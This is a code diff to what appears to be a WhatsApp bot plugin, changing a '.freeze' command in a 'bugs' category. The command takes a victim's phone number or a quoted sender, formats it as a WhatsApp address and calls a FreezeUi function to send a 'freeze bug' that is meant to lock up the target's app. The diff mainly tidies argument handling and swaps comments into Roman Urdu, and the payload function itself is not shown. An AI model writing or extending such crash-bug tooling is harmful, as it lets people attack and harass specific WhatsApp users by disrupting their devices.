@@ -113,49 +113,41 @@ cmd({
     category: "bugs",
     react: "❄️",
     filename: __filename
-}, async (conn, mek, msg, { from, reply, sender, args }) => {
+}, async (conn, mek, msg, options) => {
     
     try {
+        // Safe destructuring
+        const { from, reply, sender, args = [] } = options || {};
+        
         let target = null;
         
-        // Safely get target from args
+        // Args se target
         if (args && args.length > 0 && args[0]) {
-            target = args[0];
+            target = args[0].trim();
         }
         
-        // Check quoted message safely
-        if (!target && msg && msg.quoted && msg.quoted.sender) {
+        // Quoted message se target
+        if (!target && msg?.quoted?.sender) {
             target = msg.quoted.sender;
         }
         
-        // If still no target
         if (!target) {
-            return reply(`❌ FREEZE BUG USAGE ❌\n\n.freeze 923001234567\n\nOr reply to a message and type: .freeze`);
+            return reply(`❌ FREEZE BUG USAGE ❌\n\n.freeze 923001234567\n\nYa kisi message ko reply karke .freeze likho`);
         }
         
-        // Clean number safely
-        let cleanNumber = '';
-        if (typeof target === 'string' || target instanceof String) {
-            cleanNumber = target.replace(/[^0-9]/g, '');
-        } else {
-            cleanNumber = String(target).replace(/[^0-9]/g, '');
-        }
+        // Clean number
+        let cleanNumber = String(target).replace(/[^0-9]/g, '');
         
-        // Validate number
         if (cleanNumber.length < 10) {
-            return reply(`❌ Invalid Number!\nUse: .freeze 923001234567`);
+            return reply(`❌ Invalid Number!\nExample: .freeze 923001234567`);
         }
         
-        // Format target
         let finalTarget = cleanNumber + '@s.whatsapp.net';
         
-        // Send status
         await reply(`⏳ Sending freeze bug to ${cleanNumber}...`);
         
-        // Call freeze function
         await FreezeUi(conn, finalTarget);
         
-        // Success message
         await reply(`✅ Freeze bug sent to ${cleanNumber}`);
         
     } catch (error) {
